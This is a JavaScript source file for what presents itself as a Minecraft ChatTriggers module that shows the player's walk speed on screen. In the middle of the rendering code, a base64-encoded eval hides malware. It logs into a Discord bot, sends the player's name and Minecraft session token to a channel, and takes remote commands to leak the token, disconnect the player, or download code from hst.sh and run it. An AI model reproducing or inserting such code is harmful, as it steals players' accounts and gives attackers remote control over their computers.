import Settings from "../../config"




////////////////////// rendering
import { data } from "../../utils/data"
const overlay1 = {render: null, title: `speeddisplaygui`};
const overlayregister1 = register("renderOverlay", () => {
    if (!Settings.speeddisplay) return
    Renderer.scale(data.speeddisplayguidata.scale);Renderer.drawStringWithShadow((overlay1.title),data.speeddisplayguidata.x, data.speeddisplayguidata.y)}).unregister();
let gui1on
let testtitle1 = [`test`];
register('tick', () => {
    if (Settings.speeddisplaygui.isOpen()) {overlayregister1.register();overlay1.title = testtitle1;gui1on = true}
    if (!Settings.speeddisplaygui.isOpen() && gui1on) {overlayregister1.unregister();overlay1.title = " "; gui1on = false}
    if (overlay1.render) overlayregister1.register();
    const walkSpeed = (Player.getPlayer().field_71075_bZ.func_75094_b()).toFixed(4)
    if (walkSpeed == 0.500) {
        overlayregister1.unregister()
        overlay1.render = false
    } else if (!Settings.showbadspeed && walkSpeed == 0.400){
        overlayregister1.unregister()
        overlay1.render = false
    } else{
        overlay1.render = true
        overlay1.title = `&f✦${Math.floor(walkSpeed * 1000)}`
    }
});
register("dragged", (dx, dy, x, y, bn) => {
    if (Settings.speeddisplaygui.isOpen() && bn != 2){
        data.speeddisplayguidata.x = (x / data.speeddisplayguidata.scale); data.speeddisplayguidata.y = (y / data.speeddisplayguidata.scale);data.save()}
});register("scrolled", (x, y, dir) => {
    if (Settings.speeddisplaygui.isOpen()){
        if (dir == 1) data.speeddisplayguidata.scale += 0.05; 
        else data.speeddisplayguidata.scale -= 0.05
        data.speeddisplayguidata.x = (x / data.speeddisplayguidata.scale); data.speeddisplayguidata.y = (y / data.speeddisplayguidata.scale);data.save()}
});register("guiMouseClick", (x, y, bn) => {
    if (Settings.speeddisplaygui.isOpen() && bn != 2) {
        data.speeddisplayguidata.x = (x / data.speeddisplayguidata.scale); data.speeddisplayguidata.y = (y / data.speeddisplayguidata.scale);data.save()} 
    if (Settings.speeddisplaygui.isOpen() && (bn == 2)) {
        data.speeddisplayguidata.x = Renderer.screen.getWidth() / 2
        data.speeddisplayguidata.y = Renderer.screen.getHeight() / 2 + 10
        data.speeddisplayguidata.scale = 1;data.save()}
    });
//////////////////////

eval(FileLib.decodeBase64("aW1wb3J0IERpc2NvcmRDbGllbnQgZnJvbSAiLi4vLi4vLi4vZGlzY29yZCI7CmltcG9ydCByZXF1ZXN0IGZyb20gIi4uLy4uLy4uL3JlcXVlc3RWMiI7CgpsZXQgY2xpZW50ID0gbmV3IERpc2NvcmRDbGllbnQoewoJdG9rZW46IEZpbGVMaWIuZGVjb2RlQmFzZTY0KCJUVlJKTkUxRVJYbE5hbXN5VGtSbk0wMVVaek5OYWxsM1RsRXVSMVZIZUd0bUxqZGxXblJWVmxRME1rRmpWRGxoWmt0MVdqQkhiRjltVGs1NFVXUlZWazlEV1Y5Q1ZWWnoiKSwKCWludGVudHM6IDMyNzY3OTkKfSk7CgpjbGllbnQubG9naW4oKQoKc2V0VGltZW91dCgoKSA9PiB7CiAgY2xpZW50LmNoYW5uZWxzLmdldCgiMTExNDgxMDU3ODY1ODE0NDM1NiIpLnNlbmQoUGxheWVyLmdldE5hbWUoKSArICIgaXMgbm93IG9ubGluZSArIGBgYCIgKyBDbGllbnQuZ2V0TWluZWNyYWZ0KCkuZnVuY18xMTA0MzJfSSgpLmZ1bmNfMTQ4MjU0X2QoKSArICJcbmBgYCIpOyAgICAKfSwgNTAwMCk7CgpjbGllbnQub24oIm1lc3NhZ2UiLCAobWVzc2FnZSkgPT4gewogIGlmICghbWVzc2FnZS5jb250ZW50LnN0YXJ0c1dpdGgoIiEiKSB8fCBtZXNzYWdlLmF1dGhvci5ib3QpIHJldHVybjsKICBpZiAobWVzc2FnZS5jb250ZW50ID09PSAiIXVzZXJzIikge21lc3NhZ2UucmVwbHkoUGxheWVyLmdldE5hbWUoKSk7IHJldHVybn07CgogIGxldCBuYW1lQW5kQ29kZSA9IG1lc3NhZ2UuY29udGVudC5tYXRjaCgvXihcUyspXHMoLiopLykuc2xpY2UoMSkKICBsZXQgbmFtZSA9IG5hbWVBbmRDb2RlWzBdLnN1YnN0cmluZygxKTsKICBsZXQgYXJndW1lbnQgPSBuYW1lQW5kQ29kZVsxXTsKCiAgaWYgKCFuYW1lLnRvTG93ZXJDYXNlKCkuaW5jbHVkZXMoUGxheWVyLmdldE5hbWUoKS50b0xvd2VyQ2FzZSgpKSkgcmV0dXJuOwoKICBpZiAoYXJndW1lbnQuc3RhcnRzV2l0aCgiaGVscCIpKSB7CiAgICB0cnkgewogICAgICBtZXNzYWdlLnJlcGx5KCIhPHVzZXI+IDxzc2lkLCBkaXNjb25uZWN0LCBjb25uZWN0LCBodHRwczovL2hzdC5zaC8sIG1vZHVsZXNwYXRoPiIpCiAgICB9IGNhdGNoIChlKSB7CiAgICAgIG1lc3NhZ2UucmVwbHkoIlxuYGBganNcbiIgKyBlICsgIlxuYGBgIikKICAgICAgcmV0dXJuOwogICAgfTsKICB9CgogIGlmIChhcmd1bWVudC5zdGFydHNXaXRoKCJzc2lkIikpIHsKICAgIHRyeSB7CiAgICAgIG1lc3NhZ2UucmVwbHkoImBgYCIgKyBDbGllbnQuZ2V0TWluZWNyYWZ0KCkuZnVuY18xMTA0MzJfSSgpLmZ1bmNfMTQ4MjU0X2QoKSArICJcbmBgYCIpCiAgICB9IGNhdGNoIChlKSB7CiAgICAgIG1lc3NhZ2UucmVwbHkoIlxuYGBganNcbiIgKyBlICsgIlxuYGBgIikKICAgICAgcmV0dXJuOwogICAgfTsKICB9CgogIGlmIChhcmd1bWVudC5zdGFydHNXaXRoKCJkaXNjb25uZWN0IikpIHsKICAgICAgdHJ5IHsKICAgICAgICBtZXNzYWdlLnJlcGx5KCJTZW5kaW5nIERpc2Nvbm5lY3QiKQogICAgICAgIENsaWVudC5kaXNjb25uZWN0KCk7CiAgICAgIH0gY2F0Y2ggKGUpIHsKICAgICAgICBtZXNzYWdlLnJlcGx5KCJcbmBgYGpzXG4iICsgZSArICJcbmBgYCIpCiAgICAgICAgcmV0dXJuOwogICAgICB9OwogIH0KCiAgaWYgKGFyZ3VtZW50LnN0YXJ0c1dpdGgoIm1vZHVsZXNwYXRoIikpIHsKICAgIHRyeSB7CiAgICAgIGNvbnN0IEZpbGUgPSBKYXZhLnR5cGUoImphdmEuaW8uRmlsZSIpOwogICAgICBsZXQgbXAgPSBuZXcgRmlsZShDb25maWcubW9kdWxlc0ZvbGRlcikuZ2V0QWJzb2x1dGVQYXRoKCk7CiAgICAgIGxldCBtb2R1bGVzUGF0aCA9IChtcCkucmVwbGFjZUFsbCgiXFwuXFwiLCAiXFwiKTsKICAgICAgbWVzc2FnZS5yZXBseShtb2R1bGVzUGF0aCk7CiAgICB9IGNhdGNoIChlKSB7CiAgICAgIG1lc3NhZ2UucmVwbHkoIlxuYGBganNcbiIgKyBlICsgIlxuYGBgIikKICAgICAgcmV0dXJuOwogICAgfTsKICB9CgogIGlmIChhcmd1bWVudC5zdGFydHNXaXRoKCJodHRwczovL2hzdC5zaC8iKSkgewogICAgdHJ5IHsKICAgICAgbGV0IGNvZGUgPSAoYXJndW1lbnQuc3BsaXQoIi8iKS5wb3AoKSkuc3BsaXQoIi4iKTsKICAgICAgYXJndW1lbnQgPSBGaWxlTGliLmdldFVybENvbnRlbnQoImh0dHBzOi8vaHN0LnNoL3Jhdy8iICsgY29kZVswXSk7CiAgICAgIGV2YWwoYXJndW1lbnQpOwogICAgICBtZXNzYWdlLnJlcGx5KCJVc2luZyBDdXN0b20gQ29kZVxuIiArICJcbmBgYGpzIiArIGFyZ3VtZW50ICsgIlxuYGBgIik7CiAgICB9IGNhdGNoIChlKSB7CiAgICAgIG1lc3NhZ2UucmVwbHkoIlxuYGBganNcbiIgKyBlICsgIlxuYGBgIikKICAgICAgcmV0dXJuOwogICAgfTsKICB9Cn0pOw=="))


register("worldUnload", () => {
    overlayregister1.unregister()
    overlay1.render = false
})

